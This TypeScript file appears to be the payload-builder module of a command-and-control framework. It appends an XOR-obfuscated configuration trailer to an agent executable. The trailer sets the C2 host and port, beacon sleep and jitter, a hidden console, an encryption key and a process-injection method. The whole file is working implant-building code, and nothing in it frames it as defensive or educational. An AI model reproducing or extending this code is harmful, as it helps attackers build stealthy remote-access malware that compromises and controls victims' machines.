const MAGIC = new Uint8Array([0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74])

export type WrapConfig = {
  ServerHost: string
  ServerPort: number
  UseTLS?: boolean
  EncryptionKey?: string
  EncryptedComms?: boolean
  ProcessInjection?: boolean
  InjectionMethod?: string
  CustomConfig?: string
}

function esc(s: string): string {
  return JSON.stringify(s ?? '')
}

function marshalTrailer(cfg: WrapConfig): Uint8Array {
  const port = String(cfg.ServerPort || 443)
  const useTls = cfg.UseTLS || port === '443' ? 'true' : 'false'
  const key = cfg.EncryptedComms === false ? '' : (cfg.EncryptionKey || '')
  const inj = cfg.ProcessInjection ? (cfg.InjectionMethod || 'crt') : 'none'
  const json =
    `{"c2_host":${esc(cfg.ServerHost)},"c2_port":${esc(port)},"use_tls":${esc(useTls)},` +
    `"sleep_interval":${esc('180')},"jitter":${esc('40')},"persistence":${esc('false')},` +
    `"hide_console":${esc('true')},"key":${esc(key)},"injection_method":${esc(inj)}}`
  return new TextEncoder().encode(json)
}

function xorBody(json: Uint8Array): Uint8Array {
  const enc = new Uint8Array(json.length)
  for (let i = 0; i < json.length; i++) {
    enc[i] = json[i] ^ ((0x5a + (12 + i)) & 0xff)
  }
  return enc
}

function stripExistingTrailer(buf: Uint8Array): Uint8Array {
  const n = buf.length
  if (n < 12) return buf
  const window = Math.min(8192, n)
  for (let off = 8; off <= window; off++) {
    const i = n - off
    if (i + 12 > n) continue
    let match = true
    for (let k = 0; k < 8; k++) {
      if (buf[i + k] !== MAGIC[k]) { match = false; break }
    }
    if (!match) continue
    const ln = buf[i + 8] | (buf[i + 9] << 8) | (buf[i + 10] << 16) | (buf[i + 11] << 24)
    if (ln > 0 && ln <= 8192 && i + 12 + ln <= n) {
      return buf.subarray(0, i)
    }
  }
  return buf
}

export async function sha256Hex(bytes: Uint8Array): Promise<string> {
  const hash = await crypto.subtle.digest('SHA-256', bytes)
  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('')
}

export async function wrapAgentBinary(exe: ArrayBuffer, cfg: WrapConfig): Promise<{ bytes: Uint8Array; json: string }> {
  const json = marshalTrailer(cfg)
  const enc = xorBody(json)
  const stripped = stripExistingTrailer(new Uint8Array(exe))
  const lenBuf = new Uint8Array(4)
  const dv = new DataView(lenBuf.buffer)
  dv.setUint32(0, json.length, true)
  const out = new Uint8Array(stripped.length + 8 + 4 + enc.length)
  out.set(stripped, 0)
  out.set(MAGIC, stripped.length)
  out.set(lenBuf, stripped.length + 8)
  out.set(enc, stripped.length + 12)
  return { bytes: out, json: new TextDecoder().decode(json) }
}
